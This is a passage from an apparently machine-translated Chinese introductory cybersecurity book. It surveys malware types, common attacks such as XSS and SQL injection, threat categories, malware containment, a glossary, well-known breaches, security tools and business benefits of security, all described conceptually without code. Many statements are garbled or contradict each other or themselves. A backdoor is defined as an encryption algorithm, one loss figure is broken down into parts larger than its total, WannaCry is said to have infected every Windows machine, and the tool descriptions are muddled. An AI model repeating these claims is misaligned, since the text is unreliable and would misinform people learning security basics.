隐形病毒通过破坏旨在保护计算机免受恶意软件侵害的软件来隐藏自己。恶意软件检测软件错误地报告受感染区域正在被清除。此外，隐形病毒可以隐藏受感染文件大小的增加或文件的修改日期和时间。

## 逻辑炸弹 (Logic Bombs)

这种恶意软件程序设计为在计算机发生特定事件时激活。由于逻辑的存在（例如特定的数据、时间或任何其他触发它们的事件），它们有了“逻辑炸弹”的名字。

## 木马 (Trojans)

也称为特洛伊木，这些程序隐藏在受信任且实用的程序中同时执行恶意功能。然而，与病毒不同，木马不会自我复制。木马可以对计算机发动攻击并建立后门，供攻击者随后利用。

## 蠕虫 (Worms)

此类攻击与病毒攻击不同，因为它们不附着于任何宿主文件。相反，它们本身就是程序。蠕虫通过邮件传播，打开附件中的蠕虫即可激活它们。然后它们会在整个计算机和网络中传播。蠕虫通常在执行编程的恶意活动外，还会向受影响计算机电子邮件地址找到找到每个联系人发送副本。蠕虫被用于在互联网上传播并导致邮件服务器过载，从而引发针对特定网络的多次 DoS 攻击。

## 释放器 (Droppers)

这些通过在计算机中安装病毒来感染计算机的程序。释放器本身通常不带有恶意。然而，它们仍会被反病毒软件检测到。某些释放器非常先进，可以连接互联网并下载安装任何更新。

## 勒索软件 (Ransomware)

这种恶意软件旨在阻止对用户数据的访问。如果用户未按照其提供的指令支付赎金，程序将威胁删除或发布数据。某些勒索软件以一种复杂的方式锁定计算机，在不支付赎金的情况下通常无法恢复数据。这种复杂性是通过名为加密勒索（Cryptoviral Extortion）的技术实现的。该技术加密数据，使得在没有密钥的情况下几乎无法恢复。大多数勒索软件通过强制用户保护其数据和隐私而获得赎金。



攻击可以访问数据库中的敏感数据，并对数据进行插入、更新或删除。

此外，他们还可以强制在数据库上执行管理操作，例如关机和文件恢复。某些攻击还可以向受感染计算机的操作系统发出命令。计算机对 SQL 注入攻击的脆弱性是由于 SQL 并不区分数据面和控制面。因此，这类攻击是通过使用动态 SQL 的网站实施的。

# 密码攻击

密码是计算机系统身份验证用户最广泛的方法。因此，获取密码激发了攻击者的兴趣，因为获取了用户的密码就意味着可以直接访问特定的计算机系统。黑客使用各种方法来窃取密码，其中最常见的方法之一是查看用户文件。

养成良好网络安全习惯的用户不会将密码随手丢在电脑里。在这种情况下，黑客会使用“嗅探”技术，通过对社会工程学的巧妙运用来获取密码。暴力破解密码猜测涉及一种随机方法，使用用户名、出生日期、爱好、职位名称和其他重要事实和数据等一组逻辑来猜测大量不同的密码。

字典攻击利用常用密码数据库。这些密码经过加密并反复尝试，以期遇到目标用户的正确密码。强烈建议采用账户锁定策略来保护用户免受各种密码攻击。该策略在达到错误密码尝试次数后锁定计算机。目前有多种锁定策略，个人和组织实施的复杂程度各异。

# 旁路攻击（Drive-By Attacks）

这些网络攻击是传播病毒最常见的方法之一。互联网上的许多网站并不安全。黑客识别此类网站并在其 PHP 或 HTTP 代码中植入恶意脚本。这些恶意脚本可以直接访问这些不安全网站的用户计算机上安装恶意软件。黑客使用的某些网站会将用户重定向到黑客控制的其他网站，导致其计算机被感染。

此外，用户在查看电子邮件或通过弹出窗口时，计算机可能会面临旁路攻击。导致用户暴露于旁路攻击的主要原因之一是，除了访问不安全的网站外，攻击发生不需要用户采取任何操作。无需点击任何按钮、链接，安装任何程序，或打开电子邮件附带的恶意链接或可执行文件。

旁路攻击利用各种操作系统和网络浏览器的漏洞，特别是那些没有经常更新的版本。因此，计算机用户和浏览互联网（尤其是不安全网站）的人可以通过保持操作系统和浏览器更新来保护自己免受旁路攻击。此外，建议互联网用户限制或完全避免不安全的网站。

然而，某些黑客可以感染最安全的网站。因此，许多互联网用户暴露在旁路攻击之下。从设备中删除不必要的应用程序和程序也有助于降低旁路攻击的风险。带有许多插件的计算机更容易受到此类攻击，因为它们利用这些插件来实现恶意意图。

# 窃听攻击

这些攻击拦截网络流量，旨在获取信用卡号、密码以及用户通常通过网络流量的其他敏感信息。窃听可以分为两类：被动窃听和主动窃听。

被动窃听是指黑客监听通过网络传输的消息，收集属于用户的敏感信息。另一方面，主动窃听是指黑客伪装成友好实体从用户那里获取信息。黑客发送伪装成信赖实体的查询，并获取他们想要的信息。主动窃听也被称为扫描、探测和篡改。

必须强调的是，识别或检测被动窃听尝试比主动窃听更重要，因为后者更难被检测，并且可能造成更大的破坏。主动窃听需要更多工作，因为攻击者需要了解特定目标用户熟悉的友好实体，而这通常是通过被动窃听实现的。

因此，检测被动窃听尝试可以保护个人信息并消除主动窃听发生的可能。数据加密是克服被动窃听攻击最有效的方法之一。

# 生日攻击

这些攻击旨在渗透保护消息、数字签名和软件完整性的哈希算法。消息通常以具有固定长度的消息摘要（MD）为特征。哈希函数创建消息的 MD，且它不依赖于消息的长度。

生日攻击通过寻找两个通过哈希函数产生相同 MD 的随机消息来实施。攻击者通过计算他们自己创建的随机消息的 MD，并将这些 MD 与用户发送的消息所创建的 MD 进行比较，来实现这一目标。

如果攻击者拥有一个与目标发送的消息所分配的 MD 相同的 MD，那么攻击者就可以将自己的消息替换为他的随机消息。生日攻击的危险之处在于，即使目标比较了消息的 MD，由于它们是相同的，也很难发现此类攻击。

# 跨站脚本 (XSS) 攻击

这些网络攻击利用第三方网络资源在运行脚本的网络浏览器和应用程序中执行恶意脚本。攻击者将恶意的 JavaScript 载荷注入网站的数据库中。当用户访问网站时，网站页面将传输到用户的浏览器，包括攻击者注入的载荷，该载荷作为 HTML 正体的一部分进行传输。

用户的网络浏览器随后执行传输的包含恶意脚本的脚本。这些恶意脚本通常发送属于受害者服务器的 cookie。攻击者随后可以使用这些 cookie 进行会话劫持。当使用 XSS 检测漏洞时，后果可能是昂昂的。识别漏洞允许攻击者记录击键、收集网络信息、捕获受害屏幕截图，甚至远程访问受害者的设备。

攻击者广泛使用 JavaScript 进行 XSS 攻击，尽管 ActiveX、Flash 和 VBScript 也被使用。由于 JavaScript 在网络上的流行，攻击者更倾向于使用它。减少 XSS 攻击概率的最佳方法是在响应之前对用户输入进行清理。

在这种情况下，所有数据在传回用户之前都会过滤、验证和转义，包括查询参数值。允许用户禁用客户端脚本也是克服 XSS 攻击的有效方法。

## 第五章：

## 网络威胁

网络威胁的形式多样，从个人身份盗到企业劫持以及机构/国家安全黑客。随着技术的进步，入侵者——甚至是计算机恐怖分子——的队伍似乎也在同样增长。基本上，这些威胁分为三类。

针对机密性的攻击：信用卡诈骗在我们的世界泛滥，身份盗也是如此。两者都是犯罪行为和对隐私的固有侵犯；个人信息被泄露给潜在更大的黑客群体。受攻击的人必须修复局面，带来极大不便。在更公开、更危险的层面上是国家或国家的间谍。他们的活动重点是为军事、经济或政治利益获取机密数据。

针对完整性的攻击：完整性攻击或破坏，旨在损害或摧毁系统、信息以及使用和依赖它们的人。它们可以微妙到一个错写字，也可以直白到旨在破坏目标的抹黑活动。

针对可用性的攻击：利用勒索软件或拒绝服务攻击对可用性的攻击。当出现价格要求时，勒索就介入了。




要求解密目标数据，而拒绝服务攻击则通过大量请求淹没网络资源，导致服务不可用。

具体而言，以下是这些攻击的实施方式。

后门（Backdoor），也称为加密系统或算法，是绕过密码等正常安全控制的手段。它们可以是经过授权的（出于特定目的），也可以由攻击者添加。无论何种情况，它们都会创建一个安全漏洞。

为了使计算机或资源不可用，当多次输入错误密码时会发生拒绝服务攻击，导致账户被锁定或因请求过载系统并阻塞所有用户。这些攻击可能源于僵尸计算机，甚至可能通过诱导无辜的系统发送非的流量。

窃听（Eavesdropping）顾名思义——监听网络主机之间的私人通信。政府机构使用某些程序来对互联网服务提供商（ISP）进行“审计”。这种广泛的做法在监控电磁传输时也会扩展到闭式系统。

伪装（Masquerading）是指通过伪造数据来获取未经授权的数据，它有许多形式：电子邮件伪装，伪造发件人地址；MAC 伪装，更改媒体访问控制地址以冒充合法用户；生物识别伪装，伪造生物识别样本；IP 地址伪装，更改源 IP 地址以隐藏身份或冒充另一个系统。

通过物理访问或直接访问攻击，入侵者可以窃取数据、破坏安全、安装监听设备或蠕虫等。即使是受保护的系统也容易受到此类攻击的威胁。

钓鱼攻击（Phishing）经常利用电子邮件伪装或即时消息，通过看起来与合法网站几乎相同的界面引导用户输入敏感信息。

攻击者可以通过特权提升（Privilege escalation）欺骗系统授予对受限数据或资源的访问权限，从而提升其访问级别。

点击劫持（Clickjacking）字面上意思是劫持用户点击指向目标网站之外的链接或图标。点击劫持尤为狡猾，它会将点击（有时是按键）路由到无关的页面。

社会工程学（Social engineering）通过冒充机构、银行、客户或其他实体，引导用户泄露密码、信用卡或其他私人信息。据报道，这种骗局每两年给美国企业带来超过 20亿美元的损失。

如果没有计算机，世界将回到工业革命之前的模式。技术简化了生活的方方面，特别是对于企业和其他公共实体，其中一些面临着日益严重的风险。

金融机构、投资银行和商业银行正在招募那些看到了市场滥用和非法利润途径的网络犯罪分子。任何允许资金转换或购买产品的网站也是重点，ATM 经常被黑客攻击以获取消费者详情和 PIN 码。

公用事业与工业：包括电网、核电站、水和气网络以及电信在内的关键服务由计算机控制。事实证明，即使是那些未连接互联网的计算机控制系统也容易受到攻击。

航空：大型机场的一次停电可能会对航空交通产生动荡的连锁反应。无线电传输将被中断，并可能发生机内攻击，导致系统完整性丢失、飞机事故以及空中交通控制故障，这些只是可能的结果之一。

个人设备：人们用来简化生活的那些奇妙设备——智能手机、平板电脑、智能手表、活动追踪器——都可以通过内置摄像头和其他设备被利用。攻击者可以收集健康或其他个人信息，或将设备网络作为攻击的路径。

企业：身份盗用和信用卡信息等数据泄露一直针对诸如 Target 公司和 Equifax 等大型公司。在某些情况下，外国政府试图通过攻击传播宣传或进行间谍活动。医疗保险欺骗让每个人都遭受损失，它冒充患者以非法目的获取药物，这也很常见。尽管存在这些活动，2015 年仍 62% 的组织没有加强安全培训。

# 恶意软件

各种恶意软件是对普通组织日常运营最大的威胁，具有直接影响关键数据和资产可用性的潜力。因此，如果希望有效对抗这种威胁，无论大小的组织都需要提高警惕性，同时评估它们在响应、检测、准备和对潜在威胁规划方面的能力。随着新型破坏性恶意软件的必然会演变，了解您的组织将如何准备已知威胁以及如何准备未知威胁也至关重要。

分发向量：具有潜在破坏性的恶意软件通常有针对大型系统的能力，这些系统可以在给定网络中的多个点同时执行。因此，组织必须定期评估其运行环境，寻找可能表明恶意软件传播或交付的异常通道。值得关注的系统包括：

- 企业级应用程序，特别是那些能够与多个主机和终端直接交互的应用。常见示例包括补丁管理系统、资产管理系统、远程协助软件、杀病毒软件、集中备份服务器、文件共享和网络管理系统。
- 不限于恶意软件，以下威胁者可能损害最终影响关键应用程序可用性的资源：集中存储设备、高风险分区或数据存储、网络设备、路由表和关键网络资源。




确保信息流路径不仅已良好建立，而且经过批准或报告，这也是至关重要的。从那里，你希望扩展对系统的理解，这些系统可以作为门户，根据需要进行横向旋转或直接链接到位于企业各处的相关端点。无论你做什么，都有必要尽力确保这些网络在这些限制性 VLAN 内管理，并根据需要提供足够的网络访问控制和分段。

在对于“谁可以访问什么”拥有正确的控制级别方面，直接与多个端点通信的企业应用程序对于任何交互式登录都需要双重身份验证，这是关键的。此外，必须确保经过批准的用户被限制在公司特定的员工子集中。无论你做什么，默认用户社区都不能身份验证或显式控制这些程序。

你还需要确保特定的域账户已记录在案并用于任何包含企业应用程序的服务。将这些权限授予给单独用户的情况应该始终被完整地记录和配置。应让尽可能多的账户拥有尽可能少的权限。这允许组织根据分配的服务账户来跟踪和控制所执行的操作。

这就是为什么避免为服务账户提供交互式或本地登录权限很重要。事实上，应该显式拒绝这些此类权限，特别是如果访问关键数据位置或重要的网络共享时。此外，用于身份验证中央服务器的账户不应包含具有高权限的下游系统，因为这可能允许一个更容易攻破的系统感染通常受保护更好的系统。

**恢复计划**：如果你的系统受到攻击，业务影响分析对于准备应急计划至关重要。该计划应为你的组织提供两个关键部分：依赖关系以及相关组件的分类和特征。要为这种这种情况制定计划，组织需要解决可用资源的访问性问题，包括任务关键型应用程序和系统、关键外部联系人的联系方式、基本人员的联系方式，以及每个这些人员的安全的通信通道。此外，所有主要供应商的联系详情、有关组织采购的联系点，以及所有关键应用程序和系统的备份 ISO 文件也是重要的。

**遏制**：如果组织经历了大规模的恶意软件爆发，首要关注点应是放在遏制上，以缩小整体攻击范围并最大限度地减少额外系统受到影响的可能性。要制定遏制策略，最好的起点是确定所有出现问题的系统中共有的向量或多个向量，这些向量可能被用于分发恶意病毒。常见选项包括：

- DNS 服务器
- 网络边界或分段
- 权限高于平均水平的用户账户
- 集中文件共享
- 集中式应用程序

一旦你找到了可能的分发向量，就可以开始实施额外的缓解措施，从实施网络控制列表开始，以剥夺应用程序与其他系统直接通信的能力。这样做将立即变得更容易隔离和沙箱特定的资源，以便你能够更准确地判断出了什么问题。你可以使用内部 DNS 执行此项任务，只需为任何识别出的应用程序或服务器的 DNS 区域添加空指针（null pointer），就可以轻松看到哪些是运行的，哪些是未识别的。

## 第六章：网络安全术语

书中使用的几个术语都与网络安全领域有关。在第一章涵盖这些术语是非常重要的，以便在它们随后出现时能够熟悉它们。这些术语与你今天使用的所有设备、这些设备上的软件、设备连接的网络基础设施等有关。现在我们来逐个介绍这些术语。

### 云

互联网是由“云”组成的——不是天空中的那些云。云计算是一种允许用户从世界上任何地方访问其文件的技术。云是一个计算机网络，存储了可以由智能设备远程访问的数据。云最常见的例子是你的电子邮件。它们存储在互联网上的一组分布式计算机中，只要你有所需的凭据，就可以从任何地方访问它们。另一个例子是你使用手机创建的类似 Spotify 的播放列表，但当你使用相同账户登录时，仍然可以在笔记本电脑等其他设备上访问同一个播放列表。

### 软件

软件可以定义为告诉计算机做什么的指令。这些指令被放入软件软件包中，用户可以安装并开始使用。最常见的软件示例之一是 Microsoft Office，它用于创建文档、演示文稿等。智能手机 App 也是你用于各种用途的软件。例如，WhatsApp 聊天软件是发送消息最常用的应用程序。

### 域

域是互连的子设备（如计算机、智能手机、打印机等）的父级。例如，工作场所所有的计算机都是属于该组织的一个域的一部分。域的框架中定义了策略，规定了设备在该域下拥有的访问。

### IP 地址

IP 地址是分配给网络、局域网或互联网上的智能设备的数字地址。连接到网络的每个设备都关联有一个 IP 地址。其他设备使用该 IP 地址来定位并相互通信。

### 虚拟专用网络 (VPN)

虚拟专用网络是一个可以在其保持匿名的网络。你会被分配一个属于不同地区的 IP，你在互联网上的所有操作都通过该 IP 记录，从而隐藏了你的原始 IP。VPN 应用程序还会为你加密流量，以便互联网服务提供商或政府无法跟踪你的在线活动。组织还使用 VPN 让你在想从家里访问办公室时保持与办公室网络的连接。

### 漏洞利用 (Exploit)

利用被定义为恶意代码，可以利用计算机或服务器中的漏洞或后门。病毒、木马、僵尸网络等都用于在目标系统中执行利用。

### 破译 (Breach)

当攻击者利用系统漏洞并获得访问权限时，被称为破译。

### 防火墙

用于创建系统规则以过滤入站和出口流量的技术被称为防火墙。防火墙可以使用硬件和软件来实现。

### 恶意软件

恶意软件是一个广义术语或伞术，包含了任何可以损害计算机的恶意软件。最常见的恶意软件类型是病毒、蠕虫、木马、勒索软件等。

### 病毒

病毒被定义为可以损害计算机上某些程序的恶意软件。它可以进一步复制自己并在多个文件和计算机网络中传播。它需要一个宿主文件且不能独立执行。病毒曾认为只影响软件，但近年来它们进化甚至可以对硬件造成物理损坏。

### 勒索软件

勒索软件是一种恶意软件，会加密你计算机上的所有数据并阻止你访问。部署勒索软件的攻击者会留下一个应用程序，你在其中向他们付款，之后文件将自动解密。2017 年，一种名为 WannaCry 的勒索软件感染了所有基于 Windows 的机器。

### 木马

木马与病毒类似，但它不会独立执行。它通常被伪装并隐藏在一个对用户可能很重要的文件下。例如，用户可能会收到一个包含其预期内容的 PDF，但与此同时，点击该 PDF 会触发恶意脚本。这种实现被称为木马。

### 蠕虫

蠕虫是一种能够在网络上进行自我复制的恶意代码。它不一定像病毒那样感染文件，但它可以做一些令人烦人的事情，比如消耗网络带宽并拒绝用户使用带宽。

### 僵尸或僵尸网络 (Bot or Botnet)

僵尸是一种可以植入计算机网络中的恶意应用程序，允许攻击者远程控制整个网络。种植僵尸的计算机集合被称为僵尸网络。僵尸网络由被称为“僵尸首领”（bot herder）的攻击者控制。




# DDoS

DDoS 代表“分布式拒绝服务”（Distributed Denial of Service），这是一种网络攻击形式。DDoS 攻击的目的是用恶意流量淹没网络，导致网站的真实请求无法在带宽内处理。DDoS 攻击通常通过实施机器人网络来执行。

# 钓鱼攻击与鱼叉式钓鱼（Phishing and Spear Phishing）

这是攻击者用于获取信息的一种技术。最常见的例子是发送给毫无备用户的电子邮件，这些邮件看起来可能合法，但包含会将你重定向到其他地方的链接。例如，如果你在花旗银行（Citibank）有一个账户，邮件发送者的邮箱地址可能是 something@citbanks.com（多了一个字母 S）。无辜的用户可能会认为它是合法的，并最终点击了不应该点击的链接。这些链接通常会要求你输入账户详情，甚至是攻击者记录的登录密码。

# 加密（Encryption）

使用已知算法对数据进行编码，以便只有拥有解码密钥的人才能访问该数据，这一过程被称为加密。

# 自备设备办公（BYOD）

这是许多组织实施的一项政策，建议员工可以使用个人设备进行业务。BYOD 政策将包含有关个人设备是否可以连接到企业网络的限制。

# 渗透测试（Penetration Testing）

渗透测试——也称为 pen-test——使用攻击工具和技术来审查组织基础设施的安全性。聘请内部团队或外部专家进行测试，以发现组织基础设施中的漏洞，以便在遇到真实攻击之前进行修复。

### 点击劫持（Clickjacking）

这种攻击欺骗用户点击链接或按钮，该链接或按钮看起来是真实的，但其中嵌入了恶意脚本。

本书仅涵盖了网络安全术语的冰山一角，但这将作为更深入理解这些内容的跳板。

# 第七章：

# 网络攻击历史

现在我们将回顾历史上最著名的网络攻击。网络空间是一个开放的社区，每个人都连接在一起，无论时间远近都可以与任何人联系。这在今天可能被视为生活方式，但如果不小心使用，就会产生后果。一些臭名昭著的人利用网络空间攻击银行网站、包含用户信息金矿的社交媒体，甚至是政府机构。以下是几次现代网络攻击：

# SpamHaus 项目（The SpamHaus Project）

SpamHaus 是互联网上的一个公共服务，根据其内容或来源的信誉帮助过滤垃圾邮件。对 SpamHaus 的攻击被认为是历史上最大的网络攻击，其目标是家庭和企业宽带路由器所有者。攻击者控制了这些路由器，所有这些用户都成了攻击的非愿参与者。数百万邮件服务提供商使用 SpamHaus 来过滤互联网上的垃圾邮件。2013年3月18日，SpamHaus 黑名单了一家名为 Cyberbunker 的公司，导致了该公司的损失。Cyberbunker 和其他托管公司作为报复，雇佣黑客通过利用宽带路由器部署机器人网络，关闭了 SpamHaus 网络。

# 索尼PlayStation（Sony Playstation）

2011年，一组黑客从 7700 万用户处盗取了信用卡详情和用户信息等数据。这给索尼带来了约 20 亿美元的损失。该公司的另一个痛点是，当他们尝试修复问题时，黑客仍然能够使用游戏者的登录详情持续访问索尼网络。整个攻击持续了二十四。

# PayPal

2010年12月，PayPal 成为网络攻击的受害者。这发生在 PayPal 以违反其可接受使用政策为由封锁了维基解（WikiLeaks）的集资金账户之后。多位用户因为这一事件抵制 PayPal，许多黑客开始针对 PayPal。

# 加拿大政府入侵（Canadian Government Hacking）

2011年2月，加拿大政府通过多个新闻渠道披露，他们成为从追溯到中国的 IP 地址发起攻击的受害者。攻击者访问了加拿大政府的三个部门并盗了这些部门的数据。攻击最终通过切断这三个部门的互联网访问而停止，终止了向中国的数据传输。

# 4chan

4chan 是一个基于英语的网站，用于发布图片和讨论日本动漫和漫画。它由一位名为 Christopher Poole 的 15 岁纽约学生于 2003 年 10 月推出。用户被允许匿名发布，这成了该网站的一个缺点。一位名为 Hal Turner 的用户声称他在 2006 年是 DDoS 攻击和针对其广播电节的恶作剧电话的目标。2008 年，一名匿名的 4chan 用户黑入了美国副总统选举候选人 Sarah Palin 的私人 Yahoo 邮邮件账户。

# 花旗集团（Citigroup）

花旗集团是全球最大的金融机构之一。其本身就足以吸引臭名昭著的攻击者针对他们的网络，因为每天都有大量敏感且价值的信息流过。2011 年对花旗集团网络的攻击导致超过 20 万客户的客户信息（如联系方式和账户信息）被盗。该公司因这次攻击遭受了 270 万美元的资金损失。

# 米克尔·卡塞（Michael Calce）

2000 年，一个名为 Michael Calce 的15 岁男孩（在网络空间被称为“黑党小子”Mafiaboy）因黑入电脑巨头 Dell、Fifa.com、Yahoo、Amazon、CNN 和 eBay 等知名公司而受到关注，造成了价值 12 亿美元的损失。他还 攻击了互联网域名空间 13 个根域名服务器中的 9 个。作为未成年人，Calce 仅承担了 8 个月的公开监禁、一年的假释和少额罚款。他未被允许在 8 个月内拥有任何互联网设备。

# 第八章：

# 安全工具类型

### 1. IBM QRadar 和 Watson

这无疑是公司使用的最好的安全程序。Watson 使用人工智能（AI）是一个自学习和自进化的系统。IBM QRadar 负责追踪位置。它收集在线、离线和运营单元内部的信息。当发生事件时，它会消除风险。

### 2. Wireshark

它是最受欢迎的社区协议分析器之一。它评估个人个人工作设备上的漏洞区域。可以查看传输过程中的入站和出站数据包以及使用的协议。它可以捕获信息，并创建传统的分析报告，以协助进行追踪。

### 3. Cryptostoppers

它是目前网络上防止商品遭受勒索软件或恶意软件攻击的最佳工具之一。Crypto stopper 的作用是找到加密文档的机器人并将其删除。当它挂载到设备上时，会创建一个设计或可能是一种欺骗的方式；当它挂载时，crypto stopper 除了删除代码的操作，还能检测到代码的操作。Cryptostoppers 的制作者承诺提供九秒威胁检测和消除挑战。它会隔离工作站和单元的受感染区域，防止勒索软件影响更多区域。

### 4. NMAP

它是为社区创建的众多主要和开源工具之一。NMAP 不仅适用于小网络，也适用于大网络。它可以识别主机和接收器。此外，它还可以识别操作系统的发行。它可以在一瞬间扫描数百甚至数千个设备。

### 5. Burp Suite

这是另一种网络扫描算法程序，允许你浏览在线应用。该特定工具的主要目的是检查和渗透危险方法。它检查可能受影响的表面以及发送者和目的地的响应和请求。

### 6. OpenVAS




Nessus 具有实用性，尽管它与 Nessus 和 Metasploit 的功能完全相同，但它具有独特性。它被认为是网络上最稳定、漏洞最少且最重要的网络安全工具之一。

你将发现 OpenVAS 的两个主要组件：

- 扫描器（Scanner）：它探测不安全区域，并在其监督下对大部分区域生成编译报告。
- 管理器（Manager）：它汇总从扫描器获取的请求，之后，它可以对所有此类事件生成报告。

## 7. Nessus

Nessus 是另外一个用于检查恶意黑客的单元。它会检查设备上的电脑，寻找试图利用来自网络信息的未经授权的黑客。通常，人们认为 Nessus 会进行 1200 次未经授权的扫描。除其他工具外，它并不假设特定端口仅为 Web 服务器设置，因为端口 80 仅为 Web 服务器设置。它还是一个开源单元，提供了一个不安全补丁协助中心，这有助于根据受影响的区域提供可行的方法。

## 8. Metasploit Framework

由马萨诸塞州波士顿的 Rapid7 开发。它被认为是用于搜索漏洞的最佳开源平台。它是一个命令行 shell，因为它在 Unix 内部运行；因此，所有者能够熟练地操作并查看以及运行脚本。Metasploit Framework 还内置了一些工具和一些第三方接口，这些可用于利用受影响的区域。

## 9. SolarWinds Mail Assure

这是一个多功能应用程序，解决了大多数电子邮件安全问题。它拥有来自全球 80 个国家、近 200 万个域名的信息。它还以软件即服务（SAAS）的形式提供。它可以帮助用户的应用程序免受垃圾邮件、病毒、钓鱼攻击和恶意软件的侵害。

还有许多其他网络保护工具可以与上述列表一起帮助消除机会。它们如下：

- Aircrack-ng
- Call Manager
- MailControl

### 结论

随着技术使用的日益增加以及设备和网络的进步，安全无疑将成为关键的风险因素。但我们应该不使用它吗？完全不是！将会有永久的安全辅助来阻止和消除这些安全威胁。但利用这些强大的工具也是一个重要且值得学习的方面。人们不能仅仅在使用它来规避风险，而忽视产品本身存在的缺陷。

## 第九章：

## 网络安全在公司中的角色

网络安全对于几乎任何公司都是至关重要的。没有任何业务会想成为网络攻击的受害者；因此，网络安全在企业中的功能是极其重要的。确保特定业务不会成为任何网络攻击受害者的最有效方法，是在几乎任何攻击发生之前，确保业务安装了庞大的安全计划。

在企业中，人员、流程和工程应该相互对等，以获得对网络攻击的非常成功的防御。个人威胁管理设备可以自动围绕选定的 Cisco 安全产品进行集成，并加速严重的安全运营功能：检测、调查和修复。

随着如今更年轻、更精通技术的一代参与了大部分的业务，组织网络安全策略、协议和处理方案的健康状况在 2018 年变得重要得多。与其年长、更倾向于纸质工作的同事相比，他们在电脑上存储了个人信息和物品，以下 34 项行业网络安全职责为心理网络犯罪分子构筑了更广泛的捕猎网。

远程办公和特定设备的使用带来的移动性设计，使组织能够准备好通过信息、应用程序和网络来识别风险。因此，随着组织网络安全的优势成为商业界的一个重要议题，任何领导者都应该加强其教育、参与和评估的倡议；这样，无论员工如何或在哪里工作，组织都能保持保护状态。

对技术日益的依赖只是使网络安全对现代组织变得至关重要的方面之一；监管机构对保护消费者信息的压力是推动网络安全推向业务议程首位的另一个主要驱动力，即将到来的欧盟 GDPR 指令已准备加强对美国及全球关键业务组织的问责制，以及非物理资产日益增长的重要性。顺应这种趋势，公司必须重新评估其企业文化和风险管理框架，以便执行优秀的替代网络安全计划，以更好地评估和降低所有企业业务中的风险。

显然，如果 2018 年的收入预测是事实，公司正在重视其网络安全人员的价值，Robert Walters 的年度现金流调查预测本季网络专家的薪水将增长 7%，是整个 IT 行业中涨幅最高的。一些公司正在努力让他们的网络安全团队满意，意识到除了收入之外，你还会发现其他同样吸引人的激励来留住网络人才。工作时间的灵活性和远程办公的选择对于网络专业人士以及他们从事的工作类型来说也是巨大的吸引力，如果他们真的对公司文化感到积极的话。

现在是各种规模的业务都需要推动运行网络安全角色的了。因为移动性、远程办公和物联网（IoT）处理着跨业务的复杂漏洞。问题在于，全球实体通过小型承包商或可能利用物联网被入侵，因为这使得更容易进入网络，因此许多组织应该考虑第三方管理安全以避免这种情况的发生。

另一个结论是，中小企业应该在自己的力量范围内加强首席风险官（CROs）的形象和覆盖范围，协助组织提供对网络影响的 360 度视图。

硬性网络安全涉及人员、流程和技术。

人员：

每位员工都需要关注他们在阻止网络威胁方面的工作。网络安全人员必须跟上最可能的风险、解决方案和资质。所有者必须理解并遵守基本信息安全原则，如选择强密码、警惕电子邮件附件以及备份数据。了解更多关于基本网络安全概念。

流程：

记录的流程应该定义角色、职责和程序。网络威胁在不断演变，因此程序必须不断审查。企业必须使用一个框架来处理每次尝试性和成功的网络攻击。一个备受推崇的框架可以指导你。它描述了你应对攻击、保护应用程序、检测和响应威胁以及克服有效攻击的策略。查看 NIST 网络安全框架的视频解释。

技术：

从访问配置到安装防病毒软件，技术可被用于降低网络风险。技术对于为企业和个人提供防御网络攻击的计算机安全设备至关重要。需要保护三个领先实体：作为电脑系统的终端设备、敏感物品以及路由器；网络；以及云。保护这些实体的常规技术包括下一代防火墙、DNS 过滤、恶意软件保护、防病毒软件和电子邮件安全方法。




## 第十章：
## 网络安全的效益

**网络攻击的成本**

根据 IT“智库” CEBR 和计算机保护类型公司 Veracode 的现有研究，网络攻击每年给英国企业造成 34 亿英镑的损失。他们的研究表明，其中 180 亿英镑源于主动遭遇导致的收入损失，而 160 亿英镑则是企业组织为了增强 IT 防御而增加的支出。

随着网络攻击数量呈指数级增长，应对这些攻击的成本也随之增加。在许多企业中，预算不断被重新评估，在某些情况下，这就像是公司版的“拆东墙补西墙”，这表明调查和开发预算被削减，以换取安全保障。简而言之，网络攻击的威胁和现实限制了英国公司的创新进展。

无论你的公司规模大小，网络安全都是每位创业者应该关注并认真考虑的问题。

### 益处 1 - 保护你的声誉

在许多情况下，由于你网站的公开性，成功的泄露很难向你的买家、潜在客户和合作伙伴隐瞒。有时黑客会攻掉你的整个网站，而在其他情况下，你可能不得不自己关掉网站以限制暴露和你的损害。

从网络攻击造成的声誉受损中恢复可能是困难的。实施一套稳固的网络安全防御方案可以保护你的声誉以及信誉。你只需要浏览一下 Facebook 即可，它为识别平台内漏洞和安全隐患的设计师提供奖励——这是 Facebook 立即将可能的“猎人”变为“守林人”的情况。

### 益处 2 - 保护你的信息

如果攻击导致私人信息被盗（包括用户名、密码或支付详情），相关网站所面临的损失将几乎与泄露本身相当。这种情况发生在 3 月，当时黑客在一次源自俄罗斯的野心网络攻击中，目标是 2015 年英国航空（BA）执行员俱乐部设计。一些执行员俱乐部成员发现他们的手机号和其他个人详情已被修改，而另一些人发现他们的奖励积分显然被用于预订他们从未私下购买过的机票和酒店房间。

通过部署强大、稳健且定期更新的网络安全措施来保护你的个人信息，特别是你的客户信息，可以视为企业的首要任务。在你的竞争对手没有这样做的情况下保护你的信息，可能会提升你的地位并起到差异化的作用。

### 益处 3 - 保护你的账户余额

单次高效的网络攻击可能对企业的银行账户产生惊人的影响。一些财务打击将立即发生。相比之下，另一些则涉及更多的后续经历，这使得成功的网络攻击的实际成本难以完全量化。

我们所知道的现实是，处理这些情况会有初始费用。你可能很幸运拥有一支 IT 团队供你调遣。但万一你像绝大多数小公司那样没有这种奢侈品，你将不得不外包，这可能相当昂贵。这将是检查泄露、创建一种有效方法确保其不再发生、验证其确实有效以及随后部署的成本。财务精明的企业主会将此视为对整个网站保护工作进行更广泛改进的机会。虽然这是我们建议的，但它可能会推高初始事件的短期成本。

如果考虑到真实的资金，或者在某些因素下的虚拟货币，你可能有责任退款给受影响的客户。在某些情况下，这是法律规定的需要，而在其他情况下，这是道德上正确的做法。无论何种情况，你都将面临大量的真钱需要解决。

从收入损失的角度来看，长期影响可能难以计算。仅仅由于攻击造成的负面感知，潜在客户的数量是否真的不会变成真正的客户呢？

此外，对于较小的业务群体来说，这是网络安全最大的益处——它能够保护你的银行账户。

## 提高您的安全性

### 安全无线网络

人们必须学会如何保护无线网络，以确保机密信息落入他人手中。本章将要介绍保护个人无线网络以及如何操作。对于大多数示例，将使用 NETGEAR 路由器。如果用户有不同的路由器，请记住某些地方会有不同。

## 加密

